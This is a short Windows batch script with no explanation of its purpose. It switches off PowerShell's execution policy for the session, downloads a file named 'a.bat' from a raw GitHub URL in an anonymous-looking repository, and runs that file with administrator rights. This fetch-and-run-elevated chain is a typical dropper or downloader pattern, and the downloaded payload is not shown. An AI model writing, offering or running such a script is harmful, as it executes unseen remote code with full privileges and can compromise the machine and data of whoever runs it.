@echo off

powershell -NoProfile -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"

powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.bat' -OutFile \"%TEMP%\a.bat\" -UseBasicParsing"

powershell -NoProfile -Command "Start-Process \"%TEMP%\a.bat\" -Verb RunAs"

pause
